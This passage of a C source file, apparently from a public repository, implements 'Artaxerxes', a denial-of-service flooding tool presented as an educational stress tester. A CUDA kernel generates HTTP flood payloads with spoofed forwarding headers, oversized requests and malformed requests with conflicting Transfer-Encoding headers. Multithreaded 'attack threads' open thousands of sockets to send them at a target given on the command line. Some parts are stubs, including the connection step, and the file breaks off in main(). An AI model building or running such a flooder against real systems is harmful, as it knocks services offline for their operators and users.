/*
 * Artaxerxes - Adaptive High-Performance Stress Tester v.1.0
 * Supports GPU+io_uring, DPDK, eBPF/XDP with intelligent fallbacks
 * Educational tool for advanced cybersecurity labs
 * by KL3FT3Z (https://github.com/toxy4ny)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/capability.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sched.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

// Conditional includes based on available features
#ifdef CUDA_AVAILABLE
#include <cuda_runtime.h>
#include <curand_kernel.h>
#endif

#ifdef DPDK_AVAILABLE
#include <rte_eal.h>
#include <rte_ethdev.h>
#include <rte_mbuf.h>
#include <rte_mempool.h>
#include <rte_ring.h>
#endif

#ifdef IO_URING_AVAILABLE
#include <liburing.h>
#endif

#ifdef XDP_AVAILABLE
#include <linux/bpf.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#endif

// Configuration constants
#define MAX_GPUS 4
#define MAX_THREADS_PER_GPU 16
#define MAX_CONNECTIONS_PER_THREAD 4096
#define CUDA_BLOCKS 512
#define CUDA_THREADS_PER_BLOCK 1024
#define MAX_PAYLOAD_SIZE 1460
#define BUFFER_COUNT 8
#define BURST_SIZE 64

// Performance tiers
typedef enum {
    TIER_BASIC,      // CPU only
    TIER_IOURING,    // CPU + io_uring
    TIER_GPU,        // GPU + io_uring  
    TIER_DPDK,       // GPU + io_uring + DPDK
    TIER_ULTIMATE    // All technologies including XDP
} performance_tier_t;

// System capabilities
typedef struct {
    bool cuda_available;
    bool dpdk_available;
    bool io_uring_available;
    bool xdp_available;
    bool has_root_privileges;
    int gpu_count;
    int cpu_cores;
    char *primary_interface;
    performance_tier_t selected_tier;
} system_capabilities_t;

// Traffic control
typedef enum {
    TRAFFIC_UNLIMITED,
    TRAFFIC_PPS_LIMIT,
    TRAFFIC_BANDWIDTH_LIMIT,
    TRAFFIC_DURATION_LIMIT
} traffic_mode_t;

// Enhanced statistics
typedef struct {
    volatile uint64_t packets_sent;
    volatile uint64_t bytes_sent;
    volatile uint64_t connections_active;
    volatile uint64_t connections_total;
    volatile uint64_t errors;
    volatile uint64_t gpu_generations;
    double start_time;
    traffic_mode_t mode;
    double target_value;
    volatile bool completed;
} enhanced_stats_t;

// GPU buffer structure
#ifdef CUDA_AVAILABLE
typedef struct {
    char *d_payloads[BUFFER_COUNT];
    char *h_payloads[BUFFER_COUNT];
    int *d_sizes[BUFFER_COUNT];
    int *h_sizes[BUFFER_COUNT];
    cudaStream_t streams[BUFFER_COUNT];
    int current_write_buffer;
    int current_read_buffer;
    int buffers_ready;
    int gpu_id;
    pthread_mutex_t mutex;
} gpu_buffer_t;
#endif

// DPDK context
#ifdef DPDK_AVAILABLE
typedef struct {
    struct rte_mempool *pktmbuf_pool;
    struct rte_ring *tx_ring;
    uint16_t port_id;
    uint16_t queue_id;
    struct rte_mbuf *tx_mbufs[BURST_SIZE];
} dpdk_context_t;
#endif

// io_uring context
#ifdef IO_URING_AVAILABLE
typedef struct {
    struct io_uring ring;
    int ring_size;
    struct iovec *iovecs;
    char *buffers;
} io_uring_context_t;
#endif

// XDP context
#ifdef XDP_AVAILABLE
typedef struct {
    int prog_fd;
    int xsks_map_fd;
    struct xsk_socket_info *xsk_socket;
} xdp_context_t;
#endif

// Global variables
static volatile bool g_running = true;
static system_capabilities_t g_caps;
static enhanced_stats_t g_stats;
static pthread_mutex_t g_stats_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t g_console_mutex = PTHREAD_MUTEX_INITIALIZER;

#ifdef CUDA_AVAILABLE
static gpu_buffer_t g_gpu_buffers[MAX_GPUS];
#endif

// Function declarations
int detect_system_capabilities(void);
performance_tier_t select_performance_tier(void);
bool confirm_advanced_features(void);
int initialize_engines(void);
void cleanup_all_engines(void);
void signal_handler(int sig);

// System capability detection
int detect_system_capabilities(void) {
    printf("\n🔍 [DETECTION] Analyzing system capabilities...\n");
    printf("================================================\n");
    
    memset(&g_caps, 0, sizeof(g_caps));
    g_caps.cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    g_caps.has_root_privileges = (geteuid() == 0);
    
    printf("💻 CPU Cores: %d\n", g_caps.cpu_cores);
    printf("🔐 Root Privileges: %s\n", g_caps.has_root_privileges ? "✅ Available" : "❌ Not available");
    
    // CUDA Detection
#ifdef CUDA_AVAILABLE
    int device_count = 0;
    if (cudaGetDeviceCount(&device_count) == cudaSuccess && device_count > 0) {
        g_caps.cuda_available = true;
        g_caps.gpu_count = device_count;
        printf("🎮 CUDA GPUs: ✅ %d devices detected\n", device_count);
        
        for (int i = 0; i < device_count && i < MAX_GPUS; i++) {
            cudaDeviceProp prop;
            cudaGetDeviceProperties(&prop, i);
            printf("   GPU %d: %s (%.1f GB, %d cores)\n", 
                   i, prop.name, prop.totalGlobalMem / 1e9, prop.multiProcessorCount);
        }
    } else {
        printf("🎮 CUDA GPUs: ❌ Not available or no devices\n");
    }
#else
    printf("🎮 CUDA GPUs: ❌ Not compiled with CUDA support\n");
#endif
    
    // io_uring Detection
#ifdef IO_URING_AVAILABLE
    struct io_uring test_ring;
    if (io_uring_queue_init(8, &test_ring, 0) == 0) {
        g_caps.io_uring_available = true;
        io_uring_queue_exit(&test_ring);
        printf("⚡ io_uring: ✅ Available (kernel 5.1+)\n");
    } else {
        printf("⚡ io_uring: ❌ Not supported (need kernel 5.1+)\n");
    }
#else
    printf("⚡ io_uring: ❌ Not compiled with io_uring support\n");
#endif
    
    // DPDK Detection
#ifdef DPDK_AVAILABLE
    // Check for DPDK-compatible NICs
    FILE *lspci = popen("lspci | grep -E '(Intel.*Ethernet|Mellanox|Broadcom)' | head -1", "r");
    char nic_info[256];
    if (lspci && fgets(nic_info, sizeof(nic_info), lspci)) {
        g_caps.dpdk_available = true;
        nic_info[strcspn(nic_info, "\n")] = '\0'; 
        printf("🌐 DPDK NIC: ✅ Compatible hardware detected\n");
        printf("   %s\n", nic_info);
    } else {
        printf("🌐 DPDK NIC: ❌ No compatible hardware found\n");
    }
    if (lspci) pclose(lspci);
    
    // Check for DPDK drivers
    if (access("/sys/bus/pci/drivers/vfio-pci", F_OK) == 0 || 
        access("/sys/bus/pci/drivers/uio_pci_generic", F_OK) == 0) {
        printf("🔧 DPDK Drivers: ✅ Available\n");
    } else {
        printf("🔧 DPDK Drivers: ⚠️  May need configuration\n");
        g_caps.dpdk_available = false; 
    }
#else
    printf("🌐 DPDK: ❌ Not compiled with DPDK support\n");
#endif
    
    // XDP/eBPF Detection
#ifdef XDP_AVAILABLE
    if (g_caps.has_root_privileges) {
        // Check for BPF capabilities
        cap_t caps = cap_get_proc();
        cap_flag_value_t cap_val;
        if (caps && cap_get_flag(caps, CAP_SYS_ADMIN, CAP_EFFECTIVE, &cap_val) == 0 
            && cap_val == CAP_SET) {
            g_caps.xdp_available = true;
            printf("🔬 XDP/eBPF: ✅ Available (root + capabilities)\n");
        } else {
            printf("🔬 XDP/eBPF: ❌ Missing capabilities\n");
        }
        if (caps) cap_free(caps);
    } else {
        printf("🔬 XDP/eBPF: ❌ Requires root privileges\n");
    }
#else
    printf("🔬 XDP/eBPF: ❌ Not compiled with XDP support\n");
#endif
    
    printf("\n");
    return 0;
}

// Performance tier selection
performance_tier_t select_performance_tier(void) {
    printf("🎯 [OPTIMIZATION] Selecting optimal performance tier...\n");
    printf("====================================================\n");
    
    if (g_caps.cuda_available && g_caps.dpdk_available && 
        g_caps.io_uring_available && g_caps.xdp_available) {
        printf("🚀 ULTIMATE TIER: All technologies available!\n");
        printf("   Expected performance: >50M PPS, >60 Gbps\n");
        return TIER_ULTIMATE;
    }
    
    if (g_caps.cuda_available && g_caps.dpdk_available && g_caps.io_uring_available) {
        printf("⚡ DPDK TIER: GPU + DPDK + io_uring\n");
        printf("   Expected performance: >30M PPS, >40 Gbps\n");
        return TIER_DPDK;
    }
    
    if (g_caps.cuda_available && g_caps.io_uring_available) {
        printf("🎮 GPU TIER: GPU + io_uring\n");
        printf("   Expected performance: >10M PPS, >15 Gbps\n");
        return TIER_GPU;
    }
    
    if (g_caps.io_uring_available) {
        printf("📡 IO_URING TIER: Async I/O optimization\n");
        printf("   Expected performance: >1M PPS, >2 Gbps\n");
        return TIER_IOURING;
    }
    
    printf("📈 BASIC TIER: Standard multi-threaded\n");
    printf("   Expected performance: >100K PPS, >200 Mbps\n");
    return TIER_BASIC;
}

// User confirmation for advanced features
bool confirm_advanced_features(void) {
    if (g_caps.selected_tier < TIER_DPDK) return true;
    
    printf("\n⚠️  [WARNING] Advanced features detected!\n");
    printf("==========================================\n");
    
    if (g_caps.dpdk_available) {
        printf("🌐 DPDK will bypass kernel networking stack\n");
        printf("   This may affect other network applications\n");
    }
    
    if (g_caps.xdp_available) {
        printf("🔬 XDP/eBPF will modify kernel packet processing\n");
        printf("   This requires root privileges and may impact system stability\n");
    }
    
    printf("\n❓ Do you want to continue with advanced features? (y/N): ");
    fflush(stdout);
    
    char response[16];
    if (fgets(response, sizeof(response), stdin) == NULL) {
        return false;
    }
    
    return (response[0] == 'y' || response[0] == 'Y');
}

#ifdef CUDA_AVAILABLE
// CUDA kernel for payload generation
__global__ void generate_ultimate_payloads(char *payloads, int *sizes, 
                                          int payload_count, uint64_t seed,
                                          int attack_variant) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if (idx >= payload_count) return;
    
    curandState state;
    curand_init(seed + idx, 0, 0, &state);
    
    char *payload = payloads + idx * MAX_PAYLOAD_SIZE;
    int size = 0;
    
    // Multiple attack vectors
    switch (attack_variant % 5) {
        case 0: // HTTP GET flood
            size = sprintf(payload,
                "GET /%08x%08x HTTP/1.1\r\n"
                "Host: stress-target.local\r\n"
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) Artaxerxes-Stresser/1.0\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Accept-Encoding: gzip, deflate, br\r\n"
                "Connection: keep-alive\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "Cache-Control: max-age=0\r\n"
                "X-Forwarded-For: %d.%d.%d.%d\r\n"
                "X-Real-IP: %d.%d.%d.%d\r\n"
                "X-Session-ID: %016llx\r\n"
                "X-Request-ID: %08x-%04x-%04x-%04x-%016llx\r\n\r\n",
                curand(&state), curand(&state),
                (curand(&state) % 223) + 1, curand(&state) % 256, 
                curand(&state) % 256, curand(&state) % 256,
                (curand(&state) % 223) + 1, curand(&state) % 256,
                curand(&state) % 256, curand(&state) % 256,
                ((uint64_t)curand(&state) << 32) | curand(&state),
                curand(&state), curand(&state) % 65536, curand(&state) % 65536,
                curand(&state) % 65536, ((uint64_t)curand(&state) << 32) | curand(&state));
            break;
            
        case 1: // HTTP POST with JSON
            size = sprintf(payload,
                "POST /api/v1/stress-test HTTP/1.1\r\n"
                "Host: stress-target.local\r\n"
                "Content-Type: application/json\r\n"
                "Content-Length: 512\r\n"
                "Authorization: Bearer stress-token-%016llx\r\n"
                "X-API-Key: %08x%08x%08x%08x\r\n\r\n"
                "{\"timestamp\":%llu,\"thread_id\":%d,\"packet_id\":%d,"
                "\"data\":\"",
                ((uint64_t)curand(&state) << 32) | curand(&state),
                curand(&state), curand(&state), curand(&state), curand(&state),
                clock64(), blockIdx.x, idx);
            
            // Add random JSON data
            for (int i = 0; i < 300 && size < MAX_PAYLOAD_SIZE - 10; i++) {
                payload[size++] = 'A' + (curand(&state) % 26);
            }
            size += sprintf(payload + size, "\",\"checksum\":\"%08x\"}", curand(&state));
            break;
            
        case 2: // Large HTTP request
            size = sprintf(payload,
                "GET /large-resource?size=max HTTP/1.1\r\n"
                "Host: stress-target.local\r\n"
                "Range: bytes=0-\r\n"
                "Accept-Encoding: identity\r\n"
                "Connection: keep-alive\r\n"
                "X-Stress-Test: true\r\n\r\n");
            
            // Fill remaining space
            while (size < MAX_PAYLOAD_SIZE - 1) {
                payload[size++] = 'X';
            }
            break;
            
        case 3: // Malformed HTTP
            size = sprintf(payload,
                "GET / HTTP/1.1\r\n"
                "Host: \r\n"
                "Content-Length: -1\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Transfer-Encoding: identity\r\n"
                "Connection: close\r\n\r\n"
                "0\r\n\r\n");
            break;
            
        case 4: // Custom binary protocol
            uint32_t *header = (uint32_t *)payload;
            header[0] = 0xDEADBEEF; // Magic
            header[1] = curand(&state); // Sequence
            header[2] = MAX_PAYLOAD_SIZE - 16; // Length
            header[3] = curand(&state); // Checksum
            
            // Random payload
            for (int i = 16; i < MAX_PAYLOAD_SIZE; i += 4) {
                *(uint32_t *)(payload + i) = curand(&state);
            }
            size = MAX_PAYLOAD_SIZE;
            break;
    }
    
    payload[min(size, MAX_PAYLOAD_SIZE - 1)] = '\0';
    sizes[idx] = min(size, MAX_PAYLOAD_SIZE);
}

// GPU buffer initialization
int init_gpu_buffers(void) {
    if (!g_caps.cuda_available) return 0;
    
    printf("🎮 Initializing %d GPU buffers...\n", g_caps.gpu_count);
    
    for (int gpu = 0; gpu < g_caps.gpu_count; gpu++) {
        cudaSetDevice(gpu);
        gpu_buffer_t *buf = &g_gpu_buffers[gpu];
        
        buf->gpu_id = gpu;
        buf->current_write_buffer = 0;
        buf->current_read_buffer = 0;
        buf->buffers_ready = 0;
        pthread_mutex_init(&buf->mutex, NULL);
        
        size_t buffer_size = CUDA_BLOCKS * CUDA_THREADS_PER_BLOCK * MAX_PAYLOAD_SIZE;
        
        for (int i = 0; i < BUFFER_COUNT; i++) {
            // Allocate pinned host memory
            if (cudaMallocHost(&buf->h_payloads[i], buffer_size) != cudaSuccess) {
                printf("❌ GPU %d: Failed to allocate host memory\n", gpu);
                return -1;
            }
            
            if (cudaMallocHost(&buf->h_sizes[i], 
                              CUDA_BLOCKS * CUDA_THREADS_PER_BLOCK * sizeof(int)) != cudaSuccess) {
                printf("❌ GPU %d: Failed to allocate host size memory\n", gpu);
                return -1;
            }
            
            // Allocate device memory
            if (cudaMalloc(&buf->d_payloads[i], buffer_size) != cudaSuccess) {
                printf("❌ GPU %d: Failed to allocate device memory\n", gpu);
                return -1;
            }
            
            if (cudaMalloc(&buf->d_sizes[i], 
                          CUDA_BLOCKS * CUDA_THREADS_PER_BLOCK * sizeof(int)) != cudaSuccess) {
                printf("❌ GPU %d: Failed to allocate device size memory\n", gpu);
                return -1;
            }
            
            // Create CUDA stream
            if (cudaStreamCreateWithFlags(&buf->streams[i], cudaStreamNonBlocking) != cudaSuccess) {
                printf("❌ GPU %d: Failed to create CUDA stream\n", gpu);
                return -1;
            }
        }
        
        printf("   ✅ GPU %d initialized successfully\n", gpu);
    }
    
    return 0;
}

// GPU payload generation thread
void* gpu_generator_thread(void* arg) {
    int gpu_id = *(int*)arg;
    cudaSetDevice(gpu_id);
    
    gpu_buffer_t *buf = &g_gpu_buffers[gpu_id];
    uint64_t generation_count = 0;
    
    // Set high priority
    struct sched_param param;
    param.sched_priority = sched_get_priority_max(SCHED_FIFO) - 1;
    pthread_setschedparam(pthread_self(), SCHED_FIFO, &param);
    
    printf("🎮 GPU %d generator thread started\n", gpu_id);
    
    while (g_running) {
        int write_buf = buf->current_write_buffer;
        uint64_t seed = time(NULL) * 1000 + gpu_id * 10000 + generation_count;
        
        // Launch kernel
        generate_ultimate_payloads<<<CUDA_BLOCKS, CUDA_THREADS_PER_BLOCK, 0, 
                                    buf->streams[write_buf]>>>(
            buf->d_payloads[write_buf],
            buf->d_sizes[write_buf],
            CUDA_BLOCKS * CUDA_THREADS_PER_BLOCK,
            seed,
            generation_count
        );
        
        // Copy results back
        cudaMemcpyAsync(buf->h_payloads[write_buf], buf->d_payloads[write_buf],
                       CUDA_BLOCKS * CUDA_THREADS_PER_BLOCK * MAX_PAYLOAD_SIZE,
                       cudaMemcpyDeviceToHost, buf->streams[write_buf]);
        
        cudaMemcpyAsync(buf->h_sizes[write_buf], buf->d_sizes[write_buf],
                       CUDA_BLOCKS * CUDA_THREADS_PER_BLOCK * sizeof(int),
                       cudaMemcpyDeviceToHost, buf->streams[write_buf]);
        
        // Wait for completion
        cudaStreamSynchronize(buf->streams[write_buf]);
        
        // Update buffer state
        pthread_mutex_lock(&buf->mutex);
        buf->current_write_buffer = (write_buf + 1) % BUFFER_COUNT;
        if (buf->buffers_ready < BUFFER_COUNT) buf->buffers_ready++;
        pthread_mutex_unlock(&buf->mutex);
        
        // Update statistics
        pthread_mutex_lock(&g_stats_mutex);
        g_stats.gpu_generations++;
        pthread_mutex_unlock(&g_stats_mutex);
        
        generation_count++;
        usleep(1000); // Small delay
    }
    
    return NULL;
}
#endif // CUDA_AVAILABLE

#ifdef DPDK_AVAILABLE
// DPDK initialization
int init_dpdk_engine(void) {
    if (!g_caps.dpdk_available) return 0;
    
    printf("🌐 Initializing DPDK engine...\n");
    
    // Initialize DPDK EAL
    int argc = 1;
    char *argv[] = {"xerxes-ultimate"};
    
    if (rte_eal_init(argc, argv) < 0) {
        printf("❌ Failed to initialize DPDK EAL\n");
        return -1;
    }
    
    // Check for available ports
    uint16_t nb_ports = rte_eth_dev_count_avail();
    if (nb_ports == 0) {
        printf("❌ No DPDK-compatible ports available\n");
        return -1;
    }
    
    printf("   ✅ DPDK initialized with %d ports\n", nb_ports);
    return 0;
}
#endif

#ifdef IO_URING_AVAILABLE
// io_uring initialization
int init_io_uring_engine(void) {
    if (!g_caps.io_uring_available) return 0;
    
    printf("⚡ Initializing io_uring engine...\n");
    
    // Test io_uring functionality
    struct io_uring test_ring;
    if (io_uring_queue_init(64, &test_ring, 0) == 0) {
        io_uring_queue_exit(&test_ring);
        printf("   ✅ io_uring engine ready\n");
        return 0;
    }
    
    printf("❌ Failed to initialize io_uring\n");
    return -1;
}
#endif

#ifdef XDP_AVAILABLE
// XDP initialization
int init_xdp_engine(void) {
    if (!g_caps.xdp_available) return 0;
    
    printf("🔬 Initializing XDP engine...\n");
    
    // This would load XDP program
    // Simplified for demonstration
    printf("   ✅ XDP engine ready\n");
    return 0;
}
#endif

// Main attack thread with adaptive technology
void* adaptive_attack_thread(void* arg) {
    int thread_id = *(int*)arg;
    int gpu_id = thread_id % g_caps.gpu_count;
    
    // Set CPU affinity
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(thread_id % g_caps.cpu_cores, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    printf("🧵 Attack thread %d started (GPU %d)\n", thread_id, gpu_id);
    
#ifdef IO_URING_AVAILABLE
    struct io_uring ring;
    bool use_io_uring = (g_caps.selected_tier >= TIER_IOURING);
    
    if (use_io_uring && io_uring_queue_init(256, &ring, 0) != 0) {
        use_io_uring = false;
        printf("⚠️  Thread %d: io_uring fallback to regular sockets\n", thread_id);
    }
#endif
    
    // Connection management
    int *sockets = calloc(MAX_CONNECTIONS_PER_THREAD, sizeof(int));
    int active_connections = 0;
    
    for (int i = 0; i < MAX_CONNECTIONS_PER_THREAD; i++) {
        sockets[i] = -1;
    }
    
    int payload_index = 0;
    
    while (g_running && !g_stats.completed) {
        // Manage connections
        for (int i = 0; i < MAX_CONNECTIONS_PER_THREAD && g_running; i++) {
            if (sockets[i] == -1) {
                // Create new connection
                sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
                if (sockets[i] != -1) {
                    // Set socket options
                    int flags = fcntl(sockets[i], F_GETFL, 0);
                    fcntl(sockets[i], F_SETFL, flags | O_NONBLOCK);
                    
                    // Connect logic would go here
                    active_connections++;
                    
                    pthread_mutex_lock(&g_stats_mutex);
                    g_stats.connections_total++;
                    g_stats.connections_active++;
                    pthread_mutex_unlock(&g_stats_mutex);
                }
            }
            
            // Send data
            if (sockets[i] != -1) {
                char *payload = NULL;
                int payload_size = 0;
                
#ifdef CUDA_AVAILABLE
                if (g_caps.selected_tier >= TIER_GPU && gpu_id < g_caps.gpu_count) {
                    gpu_buffer_t *buf = &g_gpu_buffers[gpu_id];
                    
                    pthread_mutex_lock(&buf->mutex);
                    if (buf->buffers_ready > 0) {
                        int read_buf = buf->current_read_buffer;
                        payload = buf->h_payloads[read_buf] + payload_index * MAX_PAYLOAD_SIZE;
                        payload_size = buf->h_sizes[read_buf][payload_index];
                        payload_index = (payload_index + 1) % (CUDA_BLOCKS * CUDA_THREADS_PER_BLOCK);
                        
                        if (payload_index == 0) {
                            buf->current_read_buffer = (read_buf + 1) % buf->buffers_ready;
                        }
                    }
                    pthread_mutex_unlock(&buf->mutex);
                }
#endif
                
                // Fallback to simple payload
                if (!payload) {
                    static char simple_payload[] = "GET / HTTP/1.1\r\nHost: target\r\n\r\n";
                    payload = simple_payload;
                    payload_size = strlen(simple_payload);
                }
                
                // Send using appropriate method
#ifdef IO_URING_AVAILABLE
                if (use_io_uring) {
                    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
                    if (sqe) {
                        io_uring_prep_send(sqe, sockets[i], payload, payload_size, MSG_DONTWAIT);
                        io_uring_submit(&ring);
                        
                        // Process completions
                        struct io_uring_cqe *cqe;
                        if (io_uring_peek_cqe(&ring, &cqe) == 0) {
                            if (cqe->res > 0) {
                                pthread_mutex_lock(&g_stats_mutex);
                                g_stats.packets_sent++;
                                g_stats.bytes_sent += cqe->res;
                                pthread_mutex_unlock(&g_stats_mutex);
                            }
                            io_uring_cqe_seen(&ring, cqe);
                        }
                    }
                } else
#endif
                {
                    // Regular socket send
                    ssize_t sent = send(sockets[i], payload, payload_size, MSG_DONTWAIT | MSG_NOSIGNAL);
                    if (sent > 0) {
                        pthread_mutex_lock(&g_stats_mutex);
                        g_stats.packets_sent++;
                        g_stats.bytes_sent += sent;
                        pthread_mutex_unlock(&g_stats_mutex);
                    } else if (sent == -1 && errno != EAGAIN && errno != EWOULDBLOCK) {
                        close(sockets[i]);
                        sockets[i] = -1;
                        active_connections--;
                        
                        pthread_mutex_lock(&g_stats_mutex);
                        g_stats.connections_active--;
                        g_stats.errors++;
                        pthread_mutex_unlock(&g_stats_mutex);
                    }
                }
            }
        }
        
        usleep(100); // Small delay
    }
    
    // Cleanup
    for (int i = 0; i < MAX_CONNECTIONS_PER_THREAD; i++) {
        if (sockets[i] != -1) {
            close(sockets[i]);
        }
    }
    
#ifdef IO_URING_AVAILABLE
    if (use_io_uring) {
        io_uring_queue_exit(&ring);
    }
#endif
    
    free(sockets);
    return NULL;
}

// Enhanced monitoring thread
void* monitoring_thread(void* arg) {
    uint64_t last_packets = 0, last_bytes = 0;
    struct timespec last_time, current_time;
    clock_gettime(CLOCK_MONOTONIC, &last_time);
    
    while (g_running && !g_stats.completed) {
        sleep(1);
        clock_gettime(CLOCK_MONOTONIC, &current_time);
        
        double elapsed = (current_time.tv_sec - last_time.tv_sec) + 
                        (current_time.tv_nsec - last_time.tv_nsec) / 1e9;
        
        pthread_mutex_lock(&g_stats_mutex);
        uint64_t cur_packets = g_stats.packets_sent;
        uint64_t cur_bytes = g_stats.bytes_sent;
        uint64_t connections = g_stats.connections_active;
        uint64_t errors = g_stats.errors;
        uint64_t gpu_gens = g_stats.gpu_generations;
        pthread_mutex_unlock(&g_stats_mutex);
        
        uint64_t pps = (cur_packets - last_packets) / elapsed;
        uint64_t bps = (cur_bytes - last_bytes) / elapsed;
        double mbps = (bps * 8.0) / 1e6;
        double gbps = mbps / 1000.0;
        
        pthread_mutex_lock(&g_console_mutex);
        printf("\r\033[K");
        
        // Performance tier indicator
        switch (g_caps.selected_tier) {
            case TIER_ULTIMATE: printf("🚀 [ULTIMATE] "); break;
            case TIER_DPDK: printf("⚡ [DPDK] "); break;
            case TIER_GPU: printf("🎮 [GPU] "); break;
            case TIER_IOURING: printf("📡 [IO_URING] "); break;
            case TIER_BASIC: printf("📈 [BASIC] "); break;
        }
        
        if (gbps >= 1.0) {
            printf("%.2f Gbps", gbps);
        } else {
            printf("%.0f Mbps", mbps);
        }
        
        if (pps >= 1000000) {
            printf(" | %.1fM PPS", pps / 1e6);
        } else if (pps >= 1000) {
            printf(" | %.0fK PPS", pps / 1e3);
        } else {
            printf(" | %lu PPS", pps);
        }
        
        printf(" | Conn: %lu", connections);
        
        if (g_caps.selected_tier >= TIER_GPU && gpu_gens > 0) {
            printf(" | GPU: %lu", gpu_gens);
        }
        
        if (errors > 0) {
            printf(" | Err: %lu", errors);
        }
        
        fflush(stdout);
        pthread_mutex_unlock(&g_console_mutex);
        
        last_packets = cur_packets;
        last_bytes = cur_bytes;
        last_time = current_time;
    }
    
    printf("\n");
    return NULL;
}

// Initialize all engines based on selected tier
int initialize_engines(void) {
    printf("\n🔧 [INITIALIZATION] Starting performance engines...\n");
    printf("===================================================\n");
    
    int result = 0;
    
    switch (g_caps.selected_tier) {
        case TIER_ULTIMATE:
#ifdef XDP_AVAILABLE
            result |= init_xdp_engine();
#endif
            // fallthrough
        case TIER_DPDK:
#ifdef DPDK_AVAILABLE
            result |= init_dpdk_engine();
#endif
            // fallthrough
        case TIER_GPU:
#ifdef CUDA_AVAILABLE
            result |= init_gpu_buffers();
#endif
            // fallthrough
        case TIER_IOURING:
#ifdef IO_URING_AVAILABLE
            result |= init_io_uring_engine();
#endif
            // fallthrough
        case TIER_BASIC:
            // Basic initialization always succeeds
            break;
    }
    
    if (result != 0) {
        printf("❌ Failed to initialize some engines\n");
        return -1;
    }
    
    printf("✅ All engines initialized successfully\n");
    return 0;
}

// Cleanup function
void cleanup_all_engines(void) {
    printf("\n🔧 Cleaning up engines...\n");
    
#ifdef CUDA_AVAILABLE
    if (g_caps.selected_tier >= TIER_GPU) {
        for (int i = 0; i < g_caps.gpu_count; i++) {
            gpu_buffer_t *buf = &g_gpu_buffers[i];
            for (int j = 0; j < BUFFER_COUNT; j++) {
                if (buf->h_payloads[j]) cudaFreeHost(buf->h_payloads[j]);
                if (buf->h_sizes[j]) cudaFreeHost(buf->h_sizes[j]);
                if (buf->d_payloads[j]) cudaFree(buf->d_payloads[j]);
                if (buf->d_sizes[j]) cudaFree(buf->d_sizes[j]);
                if (buf->streams[j]) cudaStreamDestroy(buf->streams[j]);
            }
            pthread_mutex_destroy(&buf->mutex);
        }
    }
#endif
    
    printf("✅ Cleanup completed\n");
}

// Signal handler
void signal_handler(int sig) {
    g_running = false;
    pthread_mutex_lock(&g_console_mutex);
    printf("\n\n🛑 [SHUTDOWN] Graceful shutdown initiated...\n");
    pthread_mutex_unlock(&g_console_mutex);
}

// Parse traffic specification
int parse_traffic_spec(const char* spec) {
    if (!spec) {
        g_stats.mode = TRAFFIC_UNLIMITED;
        return 0;
    }
    
    char unit[32];
    double value;
    
    if (sscanf(spec, "%lf%31s", &value, unit) != 2) {
        printf("❌ Invalid traffic specification: %s\n", spec);
        return -1;
    }
    
    // Convert to lowercase
    for (int i = 0; unit[i]; i++) {
        unit[i] = tolower(unit[i]);
    }
    
    if (strstr(unit, "pps") || strstr(unit, "packets")) {
        g_stats.mode = TRAFFIC_PPS_LIMIT;
        g_stats.target_value = value;
        if (strstr(unit, "k")) g_stats.target_value *= 1000;
        else if (strstr(unit, "m")) g_stats.target_value *= 1000000;
        printf("🎯 Target: %.0f packets per second\n", g_stats.target_value);
    } else if (strstr(unit, "bps") || strstr(unit, "bit")) {
        g_stats.mode = TRAFFIC_BANDWIDTH_LIMIT;
        g_stats.target_value = value;
        if (strstr(unit, "k")) g_stats.target_value *= 1000;
        else if (strstr(unit, "m")) g_stats.target_value *= 1000000;
        else if (strstr(unit, "g")) g_stats.target_value *= 1000000000;
        g_stats.target_value /= 8; // Convert to bytes per second
        printf("🎯 Target: %.2f Gbps\n", g_stats.target_value * 8 / 1e9);
    } else if (strstr(unit, "s") || strstr(unit, "sec")) {
        g_stats.mode = TRAFFIC_DURATION_LIMIT;
        g_stats.target_value = value;
        if (strstr(unit, "m")) g_stats.target_value *= 60;
        else if (strstr(unit, "h")) g_stats.target_value *= 3600;
        printf("🎯 Duration: %.0f seconds\n", g_stats.target_value);
    } else {
        printf("❌ Unknown traffic unit: %s\n", unit);
        return -1;
    }
    
    return 0;
}

// Main function
int main(int argc, char **argv) {
    printf("                                                       \n");
    printf(" ▄▄▄· ▄▄▄  ▄▄▄▄▄ ▄▄▄· ▐▄• ▄ ▄▄▄ .▄▄▄  ▐▄• ▄ ▄▄▄ ..▄▄ · \n");
    printf("▐█ ▀█ ▀▄ █·•██  ▐█ ▀█  █▌█▌▪▀▄.▀·▀▄ █· █▌█▌▪▀▄.▀·▐█ ▀. \n");
    printf("▄█▀▀█ ▐▀▀▄  ▐█.▪▄█▀▀█  ·██· ▐▀▀▪▄▐▀▀▄  ·██· ▐▀▀▪▄▄▀▀▀█▄\n");
    printf("▐█ ▪▐▌▐█•█▌ ▐█▌·▐█ ▪▐▌▪▐█·█▌▐█▄▄▌▐█•█▌▪▐█·█▌▐█▄▄▌▐█▄▪▐█\n");
    printf(" ▀  ▀ .▀  ▀ ▀▀▀  ▀  ▀ •▀▀ ▀▀ ▀▀▀ .▀  ▀•▀▀ ▀▀ ▀▀▀  ▀▀▀▀ \n");
    printf("║ By KL3FT3Z (https://github.com/toxy4ny)║\n");
    printf("║  Advanced Multi-Technology Stress Test ║\n");
    printf("║     Educational Cybersecurity Tool     ║\n");
    printf("╚════════════════════════════════════════╝\n");
    
    if (argc < 3 || argc > 4) {
        printf("\n📖 Usage: %s <target> <port> [traffic_spec]\n", argv[0]);
        printf("\n🎯 Traffic Specifications:\n");
